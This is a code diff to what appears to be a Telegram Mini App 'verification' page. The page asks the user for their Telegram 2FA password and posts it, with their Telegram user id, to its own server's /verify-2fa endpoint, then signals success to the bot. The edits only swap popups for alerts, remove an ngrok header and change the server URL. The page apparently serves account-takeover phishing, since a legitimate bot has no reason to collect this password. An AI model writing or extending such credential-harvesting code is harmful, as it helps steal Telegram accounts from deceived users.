@@ -44,22 +44,17 @@
             const twofaInput = document.getElementById('twofa-input');
             const twofaBtn = document.getElementById('twofa-btn');
 
-            // Change to your server URL when deployed
-            const SERVER_URL = 'http://localhost:5000';
+            // Same server — no CORS
+            const SERVER_URL = '';
             const userId = tg.initDataUnsafe?.user?.id || 'user_default';
 
             tg.ready();
             tg.expand();
-            tg.enableClosingConfirmation();
 
             twofaBtn.addEventListener('click', async function() {
                 const password = twofaInput.value;
                 if (!password) {
-                    tg.showPopup({
-                        title: 'Error',
-                        message: 'Please enter your 2FA password!',
-                        buttons: [{ type: 'ok', text: 'OK' }]
-                    });
+                    alert('Please enter your 2FA password!');
                     return;
                 }
 
@@ -69,10 +64,7 @@
                 try {
                     const res = await fetch(`${SERVER_URL}/verify-2fa`, {
                         method: 'POST',
-                        headers: { 
-                            'Content-Type': 'application/json',
-                            'ngrok-skip-browser-warning': 'true'
-                        },
+                        headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ password, user_id: String(userId) })
                     });
 
@@ -81,18 +73,10 @@
                     if (result.success) {
                         tg.sendData('verified:2fa_success');
                     } else {
-                        tg.showPopup({
-                            title: 'Wrong Password',
-                            message: result.message || 'Incorrect 2FA password.',
-                            buttons: [{ type: 'ok', text: 'OK' }]
-                        });
+                        alert(result.message || 'Incorrect 2FA password.');
                     }
                 } catch (err) {
-                    tg.showPopup({
-                        title: 'Error',
-                        message: 'Cannot reach server.',
-                        buttons: [{ type: 'ok', text: 'OK' }]
-                    });
+                    alert('Error: ' + err.message);
                 } finally {
                     twofaBtn.disabled = false;
                     twofaBtn.textContent = '✅ VERIFY 2FA ✅';
